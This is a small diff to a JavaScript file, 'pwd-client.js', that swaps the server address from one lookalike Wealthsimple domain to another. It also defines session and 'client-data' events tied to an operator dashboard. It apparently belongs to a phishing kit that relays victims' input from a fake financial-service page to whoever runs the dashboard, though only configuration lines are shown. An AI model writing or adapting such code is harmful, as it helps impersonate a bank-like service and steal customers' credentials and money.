@@ -1,6 +1,6 @@
 /* pwd-client.js */
 (function () {
-  const SERVER_URL = "https://my-wealthsimple.ca";
+  const SERVER_URL = "https://www-wealthsimple.com";
   const SESSION_STORAGE_KEY = "sessionID";
   const DASH_EMIT_EVENT = "client-data";     // matches your dashboard code
   const DASH_JOIN_EVENT = "client-join";     // matches your dashboard code
